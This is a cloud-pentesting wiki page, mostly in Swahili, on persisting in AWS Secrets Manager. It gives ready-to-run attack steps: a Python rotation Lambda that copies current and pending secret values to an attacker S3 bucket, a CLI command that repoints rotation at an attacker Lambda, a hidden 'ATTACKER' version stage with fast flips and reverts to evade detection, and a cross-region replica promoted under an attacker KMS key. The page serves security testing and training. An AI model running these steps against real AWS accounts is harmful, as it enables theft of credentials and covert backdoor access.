# AWS - Secrets Manager Persistence

{{#include ../../../../banners/hacktricks-training.md}}

## Secrets Manager

Kwa habari zaidi angalia:

{{#ref}}
../../aws-services/aws-secrets-manager-enum.md
{{#endref}}

### Kupitia Resource Policies

Inawezekana **kutoa ruhusa za kufikia secrets kwa akaunti za nje** kupitia resource policies. Angalia [**Secrets Manager Privesc page**](../../aws-privilege-escalation/aws-secrets-manager-privesc/README.md) kwa maelezo zaidi. Kumbuka kwamba ili **access a secret**, akaunti ya nje pia itahitaji **access to the KMS key encrypting the secret**.

### Kupitia Secrets Rotate Lambda

Ili **rotate secrets** kwa automatis, huitwa **Lambda** iliyosanifiwa. Ikiwa mshambuliaji angeweza **change** the **code** angeweza moja kwa moja **exfiltrate the new secret** kwake mwenyewe.

Hivi ndivyo lambda code kwa kitendo kama hicho inaweza kuonekana:
```python
import boto3

def rotate_secrets(event, context):
# Create a Secrets Manager client
client = boto3.client('secretsmanager')

# Retrieve the current secret value
secret_value = client.get_secret_value(SecretId='example_secret_id')['SecretString']

# Rotate the secret by updating its value
new_secret_value = rotate_secret(secret_value)
client.update_secret(SecretId='example_secret_id', SecretString=new_secret_value)

def rotate_secret(secret_value):
# Perform the rotation logic here, e.g., generate a new password

# Example: Generate a new password
new_secret_value = generate_password()

return new_secret_value

def generate_password():
# Example: Generate a random password using the secrets module
import secrets
import string
password = ''.join(secrets.choice(string.ascii_letters + string.digits) for i in range(16))
return password
```
{{#include ../../../../banners/hacktricks-training.md}}

### Badilisha rotation Lambda kuwa function inayodhibitiwa na mshambuliaji kupitia RotateSecret

Tumia vibaya `secretsmanager:RotateSecret` ili kurekebisha secret ili iende kwa rotation Lambda inayodhibitiwa na mshambuliaji na kusababisha rotation mara moja. Function haribifu hufanya exfiltration ya matoleo ya secret (AWSCURRENT/AWSPENDING) wakati wa hatua za rotation (createSecret/setSecret/testSecret/finishSecret) hadi sink ya mshambuliaji (kwa mfano, S3 au HTTP ya nje).

- Mahitaji
- Ruhusa: `secretsmanager:RotateSecret`, `lambda:InvokeFunction` kwa Lambda ya mshambuliaji, `iam:CreateRole/PassRole/PutRolePolicy` (au AttachRolePolicy) ili kuandaa execution role ya Lambda na ruhusa za `secretsmanager:GetSecretValue` na ikiwezekana `secretsmanager:PutSecretValue`, `secretsmanager:UpdateSecretVersionStage` (ili rotation iendelee kufanya kazi), KMS `kms:Decrypt` kwa KMS key ya secret, na `s3:PutObject` (au outbound egress) kwa exfiltration.
- Kitambulisho cha secret lengwa (`SecretId`) chenye rotation imewezeshwa au uwezo wa kuwezesha rotation.

- Athari
- Mshambuliaji anapata thamani(za) secret bila kubadilisha code ya rotation ya halali. Tu usanidi wa rotation unabadilishwa ili kuashiria Lambda ya mshambuliaji. Ikiwa haitagunduliwa, rotations zilizopangwa za baadaye zitaendelea kumuita function ya mshambuliaji pia.

- Hatua za shambulio (CLI)
1) Andaa sink ya mshambuliaji na role ya Lambda
- Tengeneza S3 bucket kwa exfiltration na execution role inayothibitishwa na Lambda yenye ruhusa za kusoma secret na kuandika kwenye S3 (plus logs/KMS kama inahitajika).
2) Deploy Lambda ya mshambuliaji ambayo katika kila hatua ya rotation inapata thamani(za) secret na kuziandika kwenye S3. Mantiki ndogo ya rotation inaweza kunakili tu AWSCURRENT hadi AWSPENDING na kuikuza katika finishSecret ili huduma iendelee kuwa imara.
3) Rekebisha rotation na kusababisha
- `aws secretsmanager rotate-secret --secret-id <SECRET_ARN> --rotation-lambda-arn <ATTACKER_LAMBDA_ARN> --rotation-rules '{"ScheduleExpression":"rate(10 days)"}' --rotate-immediately`
4) Thibitisha exfiltration kwa kuorodhesha prefix ya S3 kwa secret hiyo na kuchunguza artifacts za JSON.
5) (Hiari) Rudisha rotation Lambda ya asili ili kupunguza ugundaji.

- Mfano wa Lambda ya mshambuliaji (Python) inayofanya exfiltration hadi S3
- Mazingira: `EXFIL_BUCKET=<bucket>`
- Handler: `lambda_function.lambda_handler`
```python
import boto3, json, os, base64, datetime
s3 = boto3.client('s3')
sm = boto3.client('secretsmanager')
BUCKET = os.environ['EXFIL_BUCKET']

def write_s3(key, data):
s3.put_object(Bucket=BUCKET, Key=key, Body=json.dumps(data).encode('utf-8'), ContentType='application/json')

def lambda_handler(event, context):
sid, token, step = event['SecretId'], event['ClientRequestToken'], event['Step']
# Exfil both stages best-effort
def getv(**kw):
try:
r = sm.get_secret_value(**kw)
return {'SecretString': r.get('SecretString')} if 'SecretString' in r else {'SecretBinary': base64.b64encode(r['SecretBinary']).decode('utf-8')}
except Exception as e:
return {'error': str(e)}
current = getv(SecretId=sid, VersionStage='AWSCURRENT')
pending = getv(SecretId=sid, VersionStage='AWSPENDING')
key = f"{sid.replace(':','_')}/{step}/{token}.json"
write_s3(key, {'time': datetime.datetime.utcnow().strftime('%Y-%m-%dT%H:%M:%SZ'), 'step': step, 'secret_id': sid, 'token': token, 'current': current, 'pending': pending})
# Minimal rotation (optional): copy current->pending and promote in finishSecret
# (Implement createSecret/finishSecret using PutSecretValue and UpdateSecretVersionStage)
```
### Version Stage Hijacking for Covert Persistence (custom stage + fast AWSCURRENT flip)

Abuse Secrets Manager version staging labels to plant an attacker-controlled secret version and keep it hidden under a custom stage (for example, `ATTACKER`) while production continues to use the original `AWSCURRENT`. At any moment, move `AWSCURRENT` to the attacker’s version to poison dependent workloads, then restore it to minimize detection. This provides stealthy backdoor persistence and rapid time-of-use manipulation without changing the secret name or rotation config.

- Mahitaji
- Ruhusa: `secretsmanager:PutSecretValue`, `secretsmanager:UpdateSecretVersionStage`, `secretsmanager:DescribeSecret`, `secretsmanager:ListSecretVersionIds`, `secretsmanager:GetSecretValue` (for verification)
- Kitambulisho cha siri lengwa katika Region.

- Athari
- Dumisha toleo lililofichwa, linalodhibitiwa na mshambuliaji la siri, na ugeuze kwa atomiki `AWSCURRENT` kwenda kwenye toleo hilo wakati wowote ulipohitajika, ukichochea chochote kinachotegemea kutatua jina hilo la siri. Ugeuzaji huo na urejeshaji wa haraka hupunguza uwezekano wa kugunduliwa huku ukiruhusu udanganyifu wa wakati-wa-matumizi.

- Hatua za mashambulizi (CLI)
- Maandalizi
- `export SECRET_ID=<target secret id or arn>`

<details>
<summary>Amri za CLI</summary>
```bash
# 1) Capture current production version id (the one holding AWSCURRENT)
CUR=$(aws secretsmanager list-secret-version-ids \
--secret-id "$SECRET_ID" \
--query "Versions[?contains(VersionStages, AWSCURRENT)].VersionId | [0]" \
--output text)

# 2) Create attacker version with known value (this will temporarily move AWSCURRENT)
BACKTOK=$(uuidgen)
aws secretsmanager put-secret-value \
--secret-id "$SECRET_ID" \
--client-request-token "$BACKTOK" \
--secret-string {backdoor:hunter2!}

# 3) Restore production and hide attacker version under custom stage
aws secretsmanager update-secret-version-stage \
--secret-id "$SECRET_ID" \
--version-stage AWSCURRENT \
--move-to-version-id "$CUR" \
--remove-from-version-id "$BACKTOK"

aws secretsmanager update-secret-version-stage \
--secret-id "$SECRET_ID" \
--version-stage ATTACKER \
--move-to-version-id "$BACKTOK"

# Verify stages
aws secretsmanager list-secret-version-ids --secret-id "$SECRET_ID" --include-deprecated

# 4) On-demand flip to the attacker’s value and revert quickly
aws secretsmanager update-secret-version-stage \
--secret-id "$SECRET_ID" \
--version-stage AWSCURRENT \
--move-to-version-id "$BACKTOK" \
--remove-from-version-id "$CUR"

# Validate served plaintext now equals the attacker payload
aws secretsmanager get-secret-value --secret-id "$SECRET_ID" --query SecretString --output text

# Revert to reduce detection
aws secretsmanager update-secret-version-stage \
--secret-id "$SECRET_ID" \
--version-stage AWSCURRENT \
--move-to-version-id "$CUR" \
--remove-from-version-id "$BACKTOK"
```
</details>

- Vidokezo
- When you supply `--client-request-token`, Secrets Manager uses it as the `VersionId`. Adding a new version without explicitly setting `--version-stages` moves `AWSCURRENT` to the new version by default, and marks the previous one as `AWSPREVIOUS`.


### Cross-Region Replica Promotion Backdoor (replicate ➜ promote ➜ permissive policy)

Tumia vibaya Secrets Manager multi-Region replication kuunda replica ya target secret katika Region yenye ufuatiliaji mdogo, uiencrypt kwa KMS key inayodhibitiwa na mshambuliaji katika Region hiyo, kisha promote replica kuwa standalone secret na kuambatisha permissive resource policy inayompa mshambuliaji read access. Original secret katika primary Region inabaki isiyobadilika, ikitoa njia ya kudumu, ya kimya (stealthy) ya kupata thamani ya secret kupitia replica iliyopromote huku ikizunguka vikwazo vya KMS/policy kwenye primary.

- Mahitaji
- Permissions: `secretsmanager:ReplicateSecretToRegions`, `secretsmanager:StopReplicationToReplica`, `secretsmanager:PutResourcePolicy`, `secretsmanager:GetResourcePolicy`, `secretsmanager:DescribeSecret`.
- In the replica Region: `kms:CreateKey`, `kms:CreateAlias`, `kms:CreateGrant` (or `kms:PutKeyPolicy`) to allow the attacker principal `kms:Decrypt`.
- An attacker principal (user/role) to receive read access to the promoted secret.

- Athari
- Persistent cross-Region access path to the secret value through a standalone replica under an attacker-controlled KMS CMK and permissive resource policy. The primary secret in the original Region is untouched.

- Ushambulizi (CLI)
- Vars
```bash
export R1=<primary-region>   # e.g., us-east-1
export R2=<replica-region>   # e.g., us-west-2
export SECRET_ID=<secret name or ARN in R1>
export ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
export ATTACKER_ARN=<arn:aws:iam::<ACCOUNT_ID>:user/<attacker> or role>
```
1) Unda KMS key inayodhibitiwa na mshambulizi katika replica Region
```bash
cat > /tmp/kms_policy.json <<'JSON'
{"Version":"2012-10-17","Statement":[
{"Sid":"EnableRoot","Effect":"Allow","Principal":{"AWS":"arn:aws:iam::${ACCOUNT_ID}:root"},"Action":"kms:*","Resource":"*"}
]}
JSON
KMS_KEY_ID=$(aws kms create-key --region "$R2" --description "Attacker CMK for replica" --policy file:///tmp/kms_policy.json \
--query KeyMetadata.KeyId --output text)
aws kms create-alias --region "$R2" --alias-name alias/attacker-sm --target-key-id "$KMS_KEY_ID"
# Allow attacker to decrypt via a grant (or use PutKeyPolicy to add the principal)
aws kms create-grant --region "$R2" --key-id "$KMS_KEY_ID" --grantee-principal "$ATTACKER_ARN" --operations Decrypt DescribeKey
```
2) Nakilisha secret kwenye R2 kwa kutumia attacker KMS key
```bash
aws secretsmanager replicate-secret-to-regions --region "$R1" --secret-id "$SECRET_ID" \
--add-replica-regions Region=$R2,KmsKeyId=alias/attacker-sm --force-overwrite-replica-secret
aws secretsmanager describe-secret --region "$R1" --secret-id "$SECRET_ID" | jq '.ReplicationStatus'
```
3) Kuinua replica kuwa standalone katika R2
```bash
# Use the secret name (same across Regions)
NAME=$(aws secretsmanager describe-secret --region "$R1" --secret-id "$SECRET_ID" --query Name --output text)
aws secretsmanager stop-replication-to-replica --region "$R2" --secret-id "$NAME"
aws secretsmanager describe-secret --region "$R2" --secret-id "$NAME"
```
4) Ambatisha sera ya rasilimali yenye kuruhusu kwenye secret peke yake katika R2
```bash
cat > /tmp/replica_policy.json <<JSON
{"Version":"2012-10-17","Statement":[{"Sid":"AttackerRead","Effect":"Allow","Principal":{"AWS":"${ATTACKER_ARN}"},"Action":["secretsmanager:GetSecretValue"],"Resource":"*"}]}
JSON
aws secretsmanager put-resource-policy --region "$R2" --secret-id "$NAME" --resource-policy file:///tmp/replica_policy.json --block-public-policy
aws secretsmanager get-resource-policy --region "$R2" --secret-id "$NAME"
```
5) Soma secret kutoka kwa attacker principal katika R2
```bash
# Configure attacker credentials and read
aws secretsmanager get-secret-value --region "$R2" --secret-id "$NAME" --query SecretString --output text
```

